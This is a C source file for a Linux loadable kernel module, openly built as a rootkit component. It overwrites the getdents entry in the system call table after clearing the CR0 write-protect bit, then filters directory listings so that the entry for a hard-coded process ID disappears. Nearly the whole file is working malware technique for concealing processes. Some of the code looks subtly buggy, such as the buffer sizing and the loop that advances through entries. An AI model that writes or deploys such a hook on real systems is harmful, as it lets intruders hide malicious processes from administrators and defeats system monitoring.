#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>
#include <linux/kernel.h>



MODULE_LICENSE("GPL");
MODULE_AUTHOR("SourceCodeDeleted");
MODULE_DESCRIPTION("Hide File Module");
MODULE_VERSION("1.0");


unsigned long **SYS_CALL_TABLE;



void EnablePageWriting(void){
	write_cr0(read_cr0() & (~0x10000));

} 
void DisablePageWriting(void){
	write_cr0(read_cr0() | 0x10000);

} 



//define our origional function. 
// Credit this author. 
// https://zuliu.me/2018/03/22/rootkit/
// My code was similar but had a few problems. Zuliu had a few better in his code.
/*
int getdents(unsigned int fd,   struct linux_dirent   *dirp,    unsigned int count);
int getdents64(unsigned int fd, struct linux_dirent64 *dirp,    unsigned int count);
*/


struct linux_dirent {
	unsigned long	  d_ino;    /* Inode number */
	unsigned long	  d_off;	  /* Offset to next linux_dirent */
	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
	char		      d_name[];   // the struct value is actually longer than this, and d_name is variable width.
}*dirp2 , *dirp3 , *retn;   // // dirp = directory pointer




char hide[]="secretfile.txt";
char HidePID[]= "5779";


asmlinkage int ( *original_getdents ) (unsigned int fd, struct linux_dirent *dirp, unsigned int count); 

//Create Our version of Open Function.  
asmlinkage int	HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){

  struct linux_dirent *retn, *dirp3; 
  int Records, RemainingBytes, length;

  Records = (*original_getdents) (fd, dirp, count);

  if (Records <= 0){
    return Records;
  }

  retn = (struct linux_dirent *) kmalloc(Records, GFP_KERNEL);
  //Copy struct from userspace to our memspace in kernel space
  copy_from_user(retn, dirp, Records);

  dirp3 = retn;
  RemainingBytes = Records;
  

  while(RemainingBytes > 0){
    length = dirp3->d_reclen;
    RemainingBytes -= dirp3->d_reclen;
  
   printk(KERN_INFO "Process Name: %s " ,   dirp3->d_name );

   if(strcmp( (dirp3->d_name) , HidePID ) == 0){
      memcpy(dirp3, (char*)dirp3+dirp3->d_reclen, RemainingBytes);
      Records -= length; 
    }

    dirp3 = (struct linux_dirent *) ((char *)dirp3 + dirp3->d_reclen);

  }
  // Copy the record back to the origional struct
  copy_to_user(dirp, retn, Records);
  kfree(retn);
  return Records;
}


// Set up hooks.
static int __init SetHooks(void) {
	// Gets Syscall Table **
 	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); 

	printk(KERN_INFO "Hooks Will Be Set.\n");
	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);

  // Opens the memory pages to be written
	EnablePageWriting();

  // Replaces Pointer Of Syscall_open on our syscall.
	original_getdents = (void*)SYS_CALL_TABLE[__NR_getdents];
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)HookGetDents;
	DisablePageWriting();

	return 0;
}







static void __exit HookCleanup(void) {

	// Clean up our Hooks
	EnablePageWriting();
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)original_getdents;
	DisablePageWriting();
	printk(KERN_INFO "HooksCleaned Up!");
}

module_init(SetHooks);
module_exit(HookCleanup);

